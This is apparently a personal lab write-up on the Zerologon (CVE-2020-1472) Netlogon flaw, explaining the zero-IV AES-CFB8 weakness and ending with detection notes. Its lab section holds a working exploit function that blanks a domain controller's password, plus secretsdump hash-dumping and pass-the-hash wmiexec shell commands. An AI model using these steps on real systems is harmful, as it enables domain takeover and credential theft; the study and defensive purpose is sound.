---
title: Zerologon
tags:
- writeups
---

## NetLogon Protocol

- **Overview**
	- is an RPC interface *(Windows domain controllers)*
	- used 4 user and machine authentication *(e.g logging in to servers using NTLM, update password)*
	- available over TCP through a dynamic port set by the *portmapper* service OR through an SMB pipe on `445`
	- it uses a customized cryptographic protocol to let a client *(a domain-joined computer)* and server *(the domain controller)* prove to each other that they both know a shared secret *(i.e hash of the client's account password)*
- initial auth handshake
	- ![[write-ups/images/Pasted image 20220602151627.png]]

## AES-CFB8 insecure use
- The cryptographic primitive both the client and server use to generate credential values is implemented in a function called `ComputeNetlogonCredential` *(takes an 8-byte input & performs transformasion w the secret esssion key)*
- To acomplish this it uses the [CFB8 (8-bit cypher feedback) mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CFB)
	- ![[write-ups/images/Pasted image 20220603141153.png]]
- Instead of generating the Initialization Vector *(IV)* randomly, the `ComputeNetlogonCredential` function **defines it as a fixed value which consits of 16 zero bytes** => this violates the requirments for using AES-CFB8 securely
- Ok but what could go wrong? Well: **for 1 in 256 keys, applying AESCFB8 encryption to an all-zero plaintext will result in all-zero ciphertext**
	- ![[write-ups/images/Pasted image 20220603141629.png]]

## Exploitation
![[write-ups/images/Pasted image 20220603143500.png]]
1. Spoofing the client credential
	- after exchanging challenges with a `NetrServerReqChallenge` call
	- a client authenticates by doing a `NetrServerAuthenticate3` call, which has a parameter `ClientCredential` *(that is computed by applying the `ComputeNetlogonCredential` to the client challenge)*
	- because we have control over the client challenge there's nothing stopping us to set it to 8 zeroes => for 1 in 256 session keys, the correct `ClientCredential` will also consist of 8 zeroes
	- session key will be different for every authentication attempt
	- computer accounts are not locked after invalid login attempt => we can try a bunch of times until we hit a key & authentication succeeds
2. Disabling signing & sealing
	- ok we can bypass the auth call, but we still have no idea what the value of the session key is
	- it becomess problematic due to Netlogon'ss transport encryption mechanism *(RPC signing & sealing)*, which uses this key but a different scheme than `ComputeNetlogonCredential`
	- luckily, signing & sealing is optional => so we can simply omit the flag in the `NetrServerAuthenticate3` call & continue
3. Spoofing a call
	- even when encryption is disabled, every call must contain a so-called `authenticator` value which is computed by applying `ComputeNetlogonCredential(w session key)` to the `ClientStoredCredential + Timestamp`
		- `ClientStoredCredential`: incrementing value maintained by the client & intialised to the same value as the `ClientCredential` we provided => will be 0
		- `Timestamp`: the current Posix time; server doesn't place many restriction on this value => simply pretend that it’s January 1st, 1970 = 0
	- `ComputeNetlogonCredential(0) = 0` => we can authenticate our first call by simply providing an all-zero authenticator & timestamp
4. Changing computer's AD password
	- we can leverage the `NetrServerPasswordSet2` call to set a new password for the client
		- password is not hashed but it is encrypted with the session key by using again `CFB8` with an all-zero IV
	- plaintext password structure in the Netlogon protocol consists of 516 bytes *(last 4 being the pass len)*
	- provide 516 zeroes => decryption to 516 zeroes => zero-length password *(setting empty passwords for a computer is not forbidden)* => can set an empty password for any computer in the domain
	- afterwards, we can simply set up a new Netlogon connection on behalf of this computer
	> **NOTE**: When changing a computer password in this way it is only changed in the AD. The targeted system itself will still locally store its original password.
5. From pass change to domain admin

### Lab
- **Perequistes**
	- check out the [POC released by secura](https://github.com/SecuraBV/CVE-2020-1472)
	- install [impacket](https://github.com/SecureAuthCorp/impacket):
		```bash
		python3 -m pip install virtualenv
		python3 -m virtualenv impacketEnv  
		source impacketEnv/bin/activate
		pip install git+https://github.com/SecureAuthCorp/impacket
		```
	- setup a local Domain Name Controller *([THM zer0logon room](https://tryhackme.com/room/zer0logon))*
- Modify `zerologon_tester.py` to reset the domain controller password & run it: `python zerologon_tester.py DC01 10.10.45.187`
	```python
	...
	
	def build_new_pass_req(dc_handle, target_computer):
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    newPassRequest['ComputerName'] = target_computer + '\x00'

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp']  = b'\x00' * 4
    newPassRequest['Authenticator'] = auth

    # consists of 516 bytes of random padding: junk + password + length of pass (last 4 bytes)
    newPassRequest['ClearNewPassword'] = b'\x00' * 516
    return newPassRequest

	def try_zero_authenticate(dc_handle, dc_ip, target_computer):
		...
		
		# It worked!
    	assert server_auth['ErrorCode'] == 0
    	server_auth.dump()
    	print(f"server challenge {serverChall}")

    	try:
        	# Trigger password reset
        	print(f"Attempting password reset on {target_computer}...")
			newPassReq = build_new_pass_req(dc_handle, target_computer)
			res        = rpc_con.request(newPassReq)
			res.dump()
		except Exception as e:
        	print(e)
		return rpc_con

	...
	```
- Dump hashes with [impacket's secretsdump.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py): `python secretsdump.py -just-dc HOLOLIVE/DC01\$@10.10.45.187`
- Pop shell w [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) by passing the hash: `python wmiexec.py HOLOLIVE/Administrator@10.10.45.187 -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568`

## Packet Analysis
TODO

## Mitigation & Detection

- many tries to authenticate unssuccessfully
- zero key stream in auth netlogon pkgs
- ssign & sseal flags are disabled
- timesstamp in auth value is 0
- choosing cipher suite of AES-CFB8

wirehark rule to detect it *(based on timestamp, negotiation opts, challenge & iv?)*

---

## References
- [Zerologon (CVE-2020-1472): An Unauthenticated Privilege Escalation to Full Domain Privileges](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)
- [Zerologon Attack Explained Technical - CVE-2020-1472](https://www.youtube.com/watch?v=EzVmGQr2IFw)
- [Whitepaper: secura](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)

## See Also
- [[write-ups/thm/core-windows-processes]]
- [[write-ups/THM]]
